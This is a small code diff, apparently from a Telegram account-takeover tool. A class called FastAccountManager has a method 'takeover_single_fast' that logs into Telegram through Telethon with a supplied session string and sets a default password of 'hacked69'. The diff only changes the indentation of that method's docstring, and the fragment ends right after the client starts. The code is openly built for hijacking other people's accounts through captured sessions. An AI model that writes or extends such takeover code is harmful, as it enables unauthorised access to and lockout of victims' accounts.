@@ -31,7 +31,7 @@ class FastAccountManager:
         return list(self.accounts.find({}))
 
     async def takeover_single_fast(self, identifier, session_string, password="hacked69"):
-    """Fast account takeover - FIXED with correct Telethon methods"""
+     """Fast account takeover - FIXED with correct Telethon methods"""
     try:
         client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
         await client.start()
